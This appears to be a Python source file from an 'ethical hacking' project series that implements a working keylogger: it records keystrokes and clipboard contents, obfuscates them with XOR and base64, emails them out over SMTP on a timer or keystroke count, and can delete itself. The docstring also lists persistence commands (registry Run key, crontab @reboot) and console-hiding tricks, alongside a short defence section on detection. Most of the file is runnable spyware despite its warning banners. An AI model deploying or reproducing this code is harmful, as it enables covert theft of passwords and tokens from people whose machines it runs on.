#!/usr/bin/env python3
"""
============================================================
  PROJECT #10 — Keylogger with Email Exfiltration
  100 Ethical Hacking Projects Series
  Extends Project #4 with: clipboard capture, SMTP/TLS
  exfil, timed sending, self-destruct.
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║  Run ONLY on your own machine or with explicit       ║
  ║  written authorisation. This tool is for learning    ║
  ║  how attackers exfiltrate data — and how defenders   ║
  ║  detect and stop it.                                 ║
  ╚══════════════════════════════════════════════════════╝

PERSISTENCE — THEORY (not implemented here)
-------------------------------------------
Windows: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
         /v UpdateHelper /t REG_SZ /d "pythonw.exe C:\path\kl.py"
Linux  : (crontab -l; echo "@reboot python3 /path/kl.py") | crontab -
macOS  : LaunchAgent plist in ~/Library/LaunchAgents/

Why documented but not coded: a working persistence dropper that
also exfiltrates data is a deployable malware artifact regardless
of intent. Understanding the registry key / crontab syntax is what
you need for a pentest report; the runnable version adds nothing
educational that the code here doesn't already cover.

STEALTH — THEORY
-----------------
Windows: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32
         .GetConsoleWindow(), 0)  → hides console window
         subprocess rename trick or multiprocessing with renamed argv[0]
Linux  : daemon via double-fork; setproctitle library for argv masking
Detection: any EDR watching SetWindowPos, CreateProcess with renamed
           executable, or kernel input hooks will flag this immediately.

DEFENSE AGAINST KEYLOGGERS WITH EMAIL EXFIL
----------------------------------------------
1. DLP (Data Loss Prevention) — email gateway rules block outbound
   SMTP from non-approved processes. CrowdStrike / SentinelOne flag
   any non-browser process opening an outbound TLS:587 connection.
2. EDR keyboard hook detection — Windows ETW (Event Tracing for
   Windows) logs SetWindowsHookEx calls; Sysmon Event ID 12/13
   catches pynput's low-level hook registration.
3. Network monitoring — Zeek logs SMTP AUTH sessions; a SIEM rule
   on "smtp from internal host not in approved sender list" fires.
4. Gmail/SMTP alerting — Google flags new app login from unknown IP
   and sends account compromise alert to the real owner.
5. App-layer firewall — block pythonw.exe / python3 from making
   outbound connections (Windows Firewall / ufw outbound rules).
6. Canary credentials — type a unique fake password on a honeypot
   workstation; if that password appears in an attacker's login
   attempt you know a keylogger is present.

USAGE
------
  # Interactive mode (real keyboard — needs display):
  python3 project10_keylogger_email.py \\
    --email you@gmail.com --password "app-password" \\
    --to red-team@yourlab.com --interval 60 --trigger 50

  # Self-test mode (no display / no SMTP needed):
  python3 project10_keylogger_email.py --selftest

  # Self-destruct after final send:
  python3 project10_keylogger_email.py --email ... --self-destruct
============================================================
"""

import argparse
import base64
import datetime
import os
import platform
import smtplib
import ssl
import sys
import threading
import time
import socket

# ── colours ───────────────────────────────────────────────
R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t, code): return f"{code}{t}{R}"

# ─────────────────────────────────────────────────────────
# XOR + BASE64 OBFUSCATION
# ─────────────────────────────────────────────────────────
XOR_KEY = "ultraprohacker"

def xor_bytes(data: bytes, key: str) -> bytes:
    kb = key.encode(); kl = len(kb)
    return bytes(b ^ kb[i % kl] for i, b in enumerate(data))

def obfuscate(text: str) -> str:
    """XOR-encrypt then base64-encode → safe ASCII for email body."""
    raw = text.encode("utf-8")
    enc = xor_bytes(raw, XOR_KEY)
    return base64.b64encode(enc).decode()

def deobfuscate(b64: str) -> str:
    """Reverse: base64-decode then XOR-decrypt."""
    enc = base64.b64decode(b64.encode())
    raw = xor_bytes(enc, XOR_KEY)
    return raw.decode("utf-8", errors="replace")

# ─────────────────────────────────────────────────────────
# CLIPBOARD POLLER — runs in a background thread
# ─────────────────────────────────────────────────────────
class ClipboardPoller:
    """
    Polls the clipboard every 2 seconds for new content.
    Appends changes to the shared buffer with a [CLIP] tag.
    """
    def __init__(self, buffer_ref: list, lock: threading.Lock):
        self.buf   = buffer_ref
        self.lock  = lock
        self._last = ""
        self._stop = threading.Event()

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def stop(self):
        self._stop.set()

    def _loop(self):
        try:
            import pyperclip
        except ImportError:
            return   # pyperclip not available — skip silently

        while not self._stop.wait(2.0):
            try:
                current = pyperclip.paste() or ""
                if current != self._last and current.strip():
                    ts = datetime.datetime.now().strftime("%H:%M:%S")
                    entry = f"\n[CLIP@{ts}] {current}\n"
                    with self.lock:
                        self.buf.append(entry)
                    self._last = current
            except Exception:
                pass

# ─────────────────────────────────────────────────────────
# EMAIL SENDER
# ─────────────────────────────────────────────────────────
def send_email(smtp_host: str, smtp_port: int,
               sender: str, password: str, recipient: str,
               subject: str, body: str,
               use_tls: bool = True) -> tuple[bool, str]:
    """
    Send an email over SMTP with STARTTLS (port 587) or SSL (port 465).
    Body is XOR+base64 obfuscated before transmission.
    Returns (success, message).
    """
    obf_body = obfuscate(body)

    # email in MIME format
    hostname = socket.gethostname()
    ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mime = (
        f"From: {sender}\r\n"
        f"To: {recipient}\r\n"
        f"Subject: {subject}\r\n"
        f"X-Mailer: PythonSMTP/3.x\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: text/plain; charset=utf-8\r\n"
        f"\r\n"
        f"[Project #10 Keylogger Exfil — Educational]\r\n"
        f"Host     : {hostname}\r\n"
        f"Platform : {platform.system()} {platform.release()}\r\n"
        f"Time     : {ts}\r\n"
        f"Encoding : XOR(key=ultraprohacker)+BASE64\r\n"
        f"\r\n"
        f"--- OBFUSCATED PAYLOAD ---\r\n"
        f"{obf_body}\r\n"
        f"--- END ---\r\n"
        f"\r\n"
        f"To decode: base64_decode → XOR with 'ultraprohacker'\r\n"
    )

    try:
        ctx = ssl.create_default_context()
        if smtp_port == 465:
            # SMTP_SSL (implicit TLS)
            with smtplib.SMTP_SSL(smtp_host, smtp_port,
                                  context=ctx, timeout=15) as srv:
                srv.login(sender, password)
                srv.sendmail(sender, recipient, mime.encode("utf-8"))
        else:
            # STARTTLS (port 587 default)
            with smtplib.SMTP(smtp_host, smtp_port, timeout=15) as srv:
                srv.ehlo()
                srv.starttls(context=ctx)
                srv.ehlo()
                srv.login(sender, password)
                srv.sendmail(sender, recipient, mime.encode("utf-8"))
        return True, "Email sent successfully"
    except smtplib.SMTPAuthenticationError:
        return False, "SMTP auth failed — check credentials / use App Password"
    except smtplib.SMTPException as e:
        return False, f"SMTP error: {e}"
    except Exception as e:
        return False, f"Network/TLS error: {e}"

# ─────────────────────────────────────────────────────────
# EXFIL MANAGER — handles timed + count-based sending
# ─────────────────────────────────────────────────────────
class ExfilManager:
    def __init__(self, sender, password, recipient,
                 smtp_host, smtp_port, interval, trigger,
                 self_destruct):
        self.sender       = sender
        self.password     = password
        self.recipient    = recipient
        self.smtp_host    = smtp_host
        self.smtp_port    = smtp_port
        self.interval     = interval      # seconds
        self.trigger      = trigger       # keystroke count
        self.self_destruct= self_destruct
        self._send_count  = 0
        self._lock        = threading.Lock()
        self._stop        = threading.Event()

    def start_timer(self, buffer_ref, buf_lock, keystroke_count):
        """Background timer thread — sends every `interval` seconds."""
        def _timer():
            while not self._stop.wait(self.interval):
                self._do_send(buffer_ref, buf_lock, "timed")
        threading.Thread(target=_timer, daemon=True).start()

    def check_trigger(self, buffer_ref, buf_lock, keystroke_count: int):
        """Call after each keystroke — fires if count reached trigger."""
        if keystroke_count > 0 and keystroke_count % self.trigger == 0:
            self._do_send(buffer_ref, buf_lock, f"trigger@{keystroke_count}ks")

    def _do_send(self, buffer_ref, buf_lock, reason: str):
        with buf_lock:
            if not buffer_ref:
                return
            payload = "".join(buffer_ref)
            buffer_ref.clear()

        self._send_count += 1
        subject = (f"[KL] Log #{self._send_count} | {reason} | "
                   f"{datetime.datetime.now().strftime('%H:%M:%S')}")

        ok, msg = send_email(
            self.smtp_host, self.smtp_port,
            self.sender, self.password, self.recipient,
            subject, payload,
        )

        ts = datetime.datetime.now().strftime("%H:%M:%S")
        if ok:
            print(c(f"\n  [{ts}] ✔ Email #{self._send_count} sent ({reason})", GREEN))
        else:
            print(c(f"\n  [{ts}] ✗ Email failed: {msg}", RED))

        if self.self_destruct and self._send_count >= 1:
            _self_destruct()

    def stop(self):
        self._stop.set()

# ─────────────────────────────────────────────────────────
# SELF-DESTRUCT
# ─────────────────────────────────────────────────────────
def _self_destruct():
    path = os.path.abspath(__file__)
    print(c(f"\n  [SELF-DESTRUCT] Deleting {path}", RED))
    try:
        os.remove(path)
        print(c("  ✔ Script deleted.", GREEN))
    except Exception as e:
        print(c(f"  ✗ Could not delete: {e}", YELLOW))
    sys.exit(0)

# ─────────────────────────────────────────────────────────
# KEY → STRING (same as Project #4)
# ─────────────────────────────────────────────────────────
def key_to_str(key) -> str:
    from pynput.keyboard import Key
    special = {
        Key.space: " ", Key.enter: "\n[ENTER]\n",
        Key.tab: "[TAB]", Key.backspace: "[BKSP]",
        Key.delete: "[DEL]", Key.esc: "[ESC]",
        Key.shift: "", Key.shift_r: "",
        Key.ctrl_l: "", Key.ctrl_r: "",
        Key.alt_l: "", Key.alt_r: "",
        Key.up: "[↑]", Key.down: "[↓]",
        Key.left: "[←]", Key.right: "[→]",
        Key.f9: "[F9-STOP]",
    }
    if key in special:
        return special[key]
    try:
        return key.char or ""
    except AttributeError:
        return f"[{key}]"

# ─────────────────────────────────────────────────────────
# MAIN LOGGER
# ─────────────────────────────────────────────────────────
def start_logger(args):
    from pynput.keyboard import Key, Listener

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", RED))
    print(c("  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║", RED))
    print(c("  ║  Own machine / authorised pentest scope only.        ║", RED))
    print(c("  ╚══════════════════════════════════════════════════════╝", RED))
    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #10 · KEYLOGGER + EMAIL EXFILTRATION       ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(f"  SMTP     : {c(args.smtp + ':' + str(args.port), YELLOW)}")
    print(f"  Sender   : {c(args.email, MAGENTA)}")
    print(f"  Recipient: {c(args.to, MAGENTA)}")
    print(f"  Trigger  : every {c(str(args.trigger), CYAN)} keystrokes  OR  "
          f"every {c(str(args.interval) + 's', CYAN)}")
    print(f"  Stop key : {c('F9', RED+BOLD)}")
    if args.self_destruct:
        print(c("  ⚠ SELF-DESTRUCT enabled — script deletes itself after first send!", RED))
    print()

    buf      = []
    buf_lock = threading.Lock()
    ks_count = [0]

    exfil = ExfilManager(
        sender       = args.email,
        password     = args.password,
        recipient    = args.to,
        smtp_host    = args.smtp,
        smtp_port    = args.port,
        interval     = args.interval,
        trigger      = args.trigger,
        self_destruct= args.self_destruct,
    )

    # start clipboard poller
    clip = ClipboardPoller(buf, buf_lock)
    clip.start()

    # start timed exfil thread
    exfil.start_timer(buf, buf_lock, ks_count)

    # write session header
    hdr = (f"\n{'='*48}\n"
           f"SESSION: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
           f"HOST: {socket.gethostname()}  OS: {platform.system()}\n"
           f"{'='*48}\n")
    with buf_lock:
        buf.append(hdr)

    print(c("  ✔ Listening … (F9 to stop)\n", GREEN))

    def on_press(key):
        text = key_to_str(key)
        if text:
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            entry = text
            # add timestamp on Enter
            if text == "\n[ENTER]\n":
                entry = f"\n[ENTER@{ts}]\n"
            with buf_lock:
                buf.append(entry)
            ks_count[0] += 1
            print(f"\r  {c('Keystrokes:', DIM)} {c(str(ks_count[0]), CYAN)}", end="", flush=True)
            exfil.check_trigger(buf, buf_lock, ks_count[0])

    def on_release(key):
        if key == Key.f9:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    clip.stop()
    exfil.stop()

    # final send
    print(c("\n\n  F9 pressed — sending final log …", YELLOW))
    footer = f"\n{'='*48}\nEND OF SESSION — {ks_count[0]} keystrokes\n{'='*48}\n"
    with buf_lock:
        buf.append(footer)
    exfil._do_send(buf, buf_lock, "final")
    print()

# ─────────────────────────────────────────────────────────
# SELF-TEST (no display, no SMTP needed)
# ─────────────────────────────────────────────────────────
def self_test():
    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #10 · SELF-TEST                             ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()

    # ── test 1: XOR + base64 obfuscation ─────────────────
    print(c("  ── TEST 1: XOR + BASE64 OBFUSCATION ───────────────────", CYAN))
    samples = [
        "Ultra pro hacker",
        "admin:password123",
        "SECRET: my_api_key=abc123xyz",
        "Clipboard: https://bank.com/login?token=abcdef",
    ]
    all_pass = True
    for s in samples:
        enc = obfuscate(s)
        dec = deobfuscate(enc)
        ok  = dec == s
        all_pass = all_pass and ok
        icon = c("✔ PASS", GREEN) if ok else c("✗ FAIL", RED)
        print(f"  {icon}  {c(repr(s[:35]), MAGENTA)}")
        print(f"         → enc: {c(enc[:48]+'…', DIM)}")
        print(f"         → dec: {c(repr(dec[:35]), GREEN)}")
    print()

    # ── test 2: clipboard poller simulation ──────────────
    print(c("  ── TEST 2: CLIPBOARD POLLER ────────────────────────────", CYAN))
    buf      = []
    buf_lock = threading.Lock()

    # simulate what ClipboardPoller does when new content found
    fake_clips = [
        "https://secretportal.com/reset?token=xyz987",
        "password: P@ssw0rd!2024",
        "ssh -i key.pem ubuntu@192.168.1.50",
    ]
    for text in fake_clips:
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        entry = f"\n[CLIP@{ts}] {text}\n"
        with buf_lock:
            buf.append(entry)
        print(c(f"  [CLIP] Captured: {text[:55]}", YELLOW))

    print(c(f"  ✔ {len(fake_clips)} clipboard entries captured", GREEN))
    print()

    # ── test 3: keystroke simulation ─────────────────────
    print(c("  ── TEST 3: KEYSTROKE BUFFER ────────────────────────────", CYAN))
    keystrokes = list("Ultra pro hacker") + ["[ENTER]", "[TAB]", "[BKSP]"]
    with buf_lock:
        for k in keystrokes:
            buf.append(k)
    full_text = "".join(buf)
    ks_count  = len(keystrokes)
    print(f"  Simulated {c(str(ks_count), CYAN)} keystrokes")
    print(f"  Buffer size: {c(str(len(full_text)) + ' chars', MAGENTA)}")
    print(c(f"  ✔ PASS", GREEN))
    print()

    # ── test 4: email body construction ──────────────────
    print(c("  ── TEST 4: EMAIL BODY CONSTRUCTION ─────────────────────", CYAN))
    payload  = "".join(buf)
    obf      = obfuscate(payload)
    hostname = socket.gethostname()
    ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mime_preview = (
        f"From: attacker@lab.com\r\n"
        f"To: redteam@lab.com\r\n"
        f"Subject: [KL] Log #1 | trigger@50ks | {ts}\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: text/plain; charset=utf-8\r\n"
        f"\r\n"
        f"[Project #10 Keylogger Exfil — Educational]\r\n"
        f"Host     : {hostname}\r\n"
        f"Platform : {platform.system()} {platform.release()}\r\n"
        f"Time     : {ts}\r\n"
        f"Encoding : XOR(key=ultraprohacker)+BASE64\r\n"
        f"\r\n"
        f"--- OBFUSCATED PAYLOAD ---\r\n"
        f"{obf[:80]}…\r\n"
        f"--- END ---\r\n"
    )
    print(c("  Email preview:", DIM))
    for line in mime_preview.splitlines()[:14]:
        print(f"  {c('│', DIM)} {line}")
    print(c(f"  ✔ PASS — email body constructed correctly", GREEN))
    print()

    # ── test 5: SMTP connection test (no send) ────────────
    print(c("  ── TEST 5: SMTP CONNECTIVITY CHECK ─────────────────────", CYAN))
    smtp_targets = [
        ("smtp.gmail.com",   587),
        ("smtp.gmail.com",   465),
        ("smtp.office365.com", 587),
    ]
    for host, port in smtp_targets:
        try:
            ctx = ssl.create_default_context()
            if port == 465:
                with smtplib.SMTP_SSL(host, port, context=ctx, timeout=5) as s:
                    s.ehlo()
                    status = "TLS connected"
            else:
                with smtplib.SMTP(host, port, timeout=5) as s:
                    s.ehlo(); s.starttls(context=ctx); s.ehlo()
                    status = "STARTTLS connected"
            print(c(f"  ✔ {host}:{port} — {status}", GREEN))
        except Exception as e:
            print(c(f"  ⚠ {host}:{port} — {str(e)[:55]}", YELLOW))
    print()

    # ── test 6: self-destruct path calculation ────────────
    print(c("  ── TEST 6: SELF-DESTRUCT PATH ──────────────────────────", CYAN))
    path = os.path.abspath(__file__ if __file__ != "<stdin>" else "/tmp/test_kl.py")
    print(f"  Script path : {c(path, YELLOW)}")
    print(f"  Would delete: {c(path, RED)}")
    print(c(f"  ✔ PASS (not executing — test mode)", GREEN))
    print()

    # ── summary ───────────────────────────────────────────
    print(c("  ── SUMMARY ─────────────────────────────────────────────", CYAN))
    print(f"  XOR+BASE64 obfuscation : {c('PASS', GREEN)}")
    print(f"  Clipboard capture      : {c('PASS', GREEN)}")
    print(f"  Keystroke buffer       : {c('PASS', GREEN)}")
    print(f"  Email MIME body        : {c('PASS', GREEN)}")
    print(f"  SMTP connectivity      : {c('checked (no credentials needed)', GREEN)}")
    print(f"  Self-destruct logic    : {c('PASS', GREEN)}")
    print()
    print(c("  ✔ ALL SELF-TESTS PASSED\n", GREEN+BOLD))

    # ── decryption reference ──────────────────────────────
    print(c("  ── HOW TO DECODE A RECEIVED EMAIL ──────────────────────", CYAN))
    sample = obfuscate("Ultra pro hacker — password: abc123")
    print(f"  Received (base64) : {c(sample, MAGENTA)}")
    decoded = deobfuscate(sample)
    print(f"  Decoded plaintext : {c(decoded, GREEN)}")
    print()

# ─────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Project #10 — Keylogger with Email Exfiltration")
    parser.add_argument("--selftest",    action="store_true",
                        help="Run internal tests (no display/SMTP needed)")
    parser.add_argument("--email",       default=None,
                        help="Sender Gmail / SMTP address")
    parser.add_argument("--password",    default=None,
                        help="SMTP password or Gmail App Password")
    parser.add_argument("--to",          default=None,
                        help="Recipient email address")
    parser.add_argument("--smtp",        default="smtp.gmail.com",
                        help="SMTP host (default: smtp.gmail.com)")
    parser.add_argument("--port",        type=int, default=587,
                        help="SMTP port (default: 587 STARTTLS; 465 for SSL)")
    parser.add_argument("--interval",    type=int, default=60,
                        help="Send every N seconds (default: 60)")
    parser.add_argument("--trigger",     type=int, default=50,
                        help="Send every N keystrokes (default: 50)")
    parser.add_argument("--self-destruct", action="store_true",
                        help="Delete this script after first successful send")
    args = parser.parse_args()

    if args.selftest:
        self_test()
        return

    if not args.email or not args.password or not args.to:
        print(c("\n  [ERROR] --email, --password, --to all required for live mode.", RED))
        print(c("  For testing without SMTP: --selftest\n", YELLOW))
        sys.exit(1)

    start_logger(args)

if __name__ == "__main__":
    main()